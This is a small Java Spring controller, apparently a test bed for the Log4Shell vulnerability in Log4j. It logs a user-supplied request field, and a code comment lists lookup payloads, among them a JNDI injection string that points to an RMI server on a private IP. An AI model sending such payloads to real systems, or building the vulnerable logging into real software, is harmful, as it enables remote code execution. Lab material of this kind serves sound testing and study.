package com.shadow.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;

@RestController
@RequestMapping("/test")
public class TestController {

    private static Logger logger = LogManager.getLogger();

    /**
     * ${jndi:rmi://192.168.1.103:1099/test}
     * ${java:vm}
     * ${java:os}
     */
    @PostMapping("/bug")
    public String test(@RequestBody TestDTO testDTO) {
        logger.info("request param {}", testDTO.getName());
        // do service
        logger.info("${java:os}");
        return "ok";
    }

}
